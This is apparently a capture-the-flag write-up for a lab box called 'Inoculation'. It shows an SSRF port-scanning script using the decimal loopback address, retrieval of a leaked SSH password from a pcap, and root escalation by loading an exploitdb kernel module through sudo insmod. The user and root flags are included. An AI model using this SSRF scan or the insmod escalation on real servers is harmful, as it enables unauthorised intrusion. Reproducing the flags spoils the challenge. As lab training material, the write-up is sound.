> Inoculation | 

**export IP=10.10.47.226**

# Nmap 

nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Inoculation
```

In port 80, we find a submit button and on catching the request we are scanning for ports using a basic script

# ape.sh

```
#!/bin/bash

for x in {1..65535};
	do cmd=$(curl -so /dev/null -X POST http://$IP/testhook.php --data "handler=https://2130706433:${x}" -w '%{size_download}')
	#2130706433 is the complete string version of '127.0.0.1'
	if [ $cmd != 0 ]; then
		echo "Port Open: $x"
	fi
done 
```

**Output**

```
Port open: 80
Port open: 9999
```

**Note : Else we can use burp's intruder to get this result**

Curling on port 9999 gives us an output

curl -X POST http://$IP/testhook.php --data "handler=http://2130706433:9999"

```
<head><title>2130706433:9999/</title></head>
<body bgcolor=white text=black link=darkblue vlink=firebrick alink=red>
<h1>listing: 
<a href="/">/</a></h1><hr noshade size=1><pre>
<b>access      user      group     date             size  name</b>

-rw-r--r--  root      root      Aug 31  2019  1311  B  <a href="dump.pcap">dump.pcap</a>
</pre><hr noshade size=1>
<small><a href="http://bytesex.org/webfs.html">webfs/1.21</a> &nbsp; 14/Sep/2020 08:43:00 GMT</small>
</body>
```

We got a `dump.pcap` file and in that we have a `pass4maynard.txt`
It is cleartext 

```
Here is your password: Js&S_uFJgg~YM4_g

Delete this after you have received it
```

# SSH using the creds with username as `maynard` and password as `Js&S_uFJgg~YM4_g`

## user.txt

================================
e7cdb6964dd72a0ef9a934e111d3ed65
================================

# Privilege Escalation

sudo -l
```
sudo: unable to resolve host inoculation
Matching Defaults entries for maynard on inoculation:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User maynard may run the following commands on inoculation:
    (ALL) NOPASSWD: /sbin/insmod
    (ALL) NOPASSWD: /sbin/rmmod
```

For `insmod` there is an exploit in exploitdb.

On running the exploit in local machine we get `cve_2017_0358.ko` and transfer it to the box.

And we have to run that.

sudo insmod ./cve_2017_0358.ko

**Note : It creates a suid in /tmp `r00t`**

And running `./r00t -p` we get the root shell!!

## root.txt

=================================
d8d4fd91665a6235a534c2caff29f55d
=================================